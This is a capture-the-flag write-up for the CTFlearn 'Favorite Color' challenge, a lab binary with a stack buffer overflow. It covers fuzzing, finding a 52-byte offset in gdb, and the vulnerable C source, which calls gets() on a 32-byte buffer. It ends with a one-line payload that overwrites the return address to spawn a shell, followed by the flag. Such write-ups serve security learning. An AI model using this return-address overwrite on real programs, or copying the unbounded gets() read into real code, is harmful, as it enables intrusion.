# Favorite Color
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
What's your favorite color? Would you like to share with me? Run the command: `ssh color@104.131.79.111 -p 1001` (pw: guest) to tell me!
## HINT:
- NONE
## STEPS:
1. First, paste the **ssh** command at your linux terminal.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194744746-859d42e7-810b-48c2-9f83-8864a49c4aec.png)


2. Based from the description, enter the pass as **guest**.
3. And we are logged in.

![image](https://user-images.githubusercontent.com/70703371/194744762-0b239ac9-342c-40e7-afe5-e4d741875a51.png)


4. Looks like we have 4 files.

![image](https://user-images.githubusercontent.com/70703371/194744769-ba36a56c-b3d8-4654-a05d-fd5631ad4b35.png)


5. Let's check are there any hidden files inside this directory.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194744792-50d4a124-9b42-4916-a44a-cd48ce87102f.png)


6. Well, there are. But looks like it's not useful.
7. Anyway, let's run the **color** program.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194744846-a76cea10-149c-4bad-9de3-330e4f549640.png)


![image](https://user-images.githubusercontent.com/70703371/194744854-dbf9075b-7b21-4668-9e29-46bac06f6c9c.png)


8. Hmm.. what may happen if we enter 100 A's.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194744902-cc1268e9-efee-46ce-a303-4c1db424fd88.png)


9. Got segmentation fault.
10. Let's run the program in gdb and enter 100 A's as the input.

> GDB

![image](https://user-images.githubusercontent.com/70703371/194744959-c21264be-8c25-40a7-8a2e-cbba43464ad4.png)


11. We got clue here, we can control the return address.
12. We need to know how many padding should we add, so we can overwrite the eip.
13. For this solution i cut the bytes in half first, but remember it has to be a multiple of 4. So let's enter **48** bytes.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194745185-56560e31-0695-4316-9620-1973a145fc96.png)


14. Got segmentation fault, but let's add another 4 bytes to it.

> 52 BYTES

![image](https://user-images.githubusercontent.com/70703371/194745273-0a8a4426-69e6-4214-9af1-1761195426b2.png)


15. We got different return address now, add another again.

> 56 BYTES

![image](https://user-images.githubusercontent.com/70703371/194745315-4594c67e-144a-49ce-b973-7fa275b04c6f.png)


16. Great! Now we know the correct padding is **52 Bytes**.
17. Now let's analyze the source code so we know the offset we need to add.

> COLOR.C

``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int vuln() {
    char buf[32];
    
    printf("Enter your favorite color: ");
    gets(buf);
    
    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i];
    }
    
    return good;
int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    
    //disable buffering.
    setbuf(stdout, NULL);
    
    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }

```

18. We need to find the start offset from this if statement.

![image](https://user-images.githubusercontent.com/70703371/194745668-b66be0ee-f0fa-490a-91be-fb0992051fd4.png)


19. Open the file in gdb and **disass** the main.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194745697-f9b9fd56-6dd7-4c4b-a3ac-f3c970a70d34.png)


20. It should start from here.

![image](https://user-images.githubusercontent.com/70703371/194745714-97865177-5981-4df6-97eb-c4f291bdcab6.png)


21. And this is the **system** function offset.

![image](https://user-images.githubusercontent.com/70703371/194745898-4034d649-e5eb-4432-aa97-e1e21a65b79d.png)


22. Quit from gdb and write this script at the ssh terminal.

> SCRIPT

```py
(python -c "print('A'*52 + '\x5f\x86\x04\x08')";cat) | ./color
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/194749310-02add362-daec-4a73-8087-03d76cee35a1.png)


23. Now strings the `flag.txt` file.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/194749346-bf280e4e-e884-49a6-a207-4ef5402fec48.png)


24. Finally! We got the flag!


## FLAG

```
CTFlearn{c0lor_0f_0verf1ow}
```

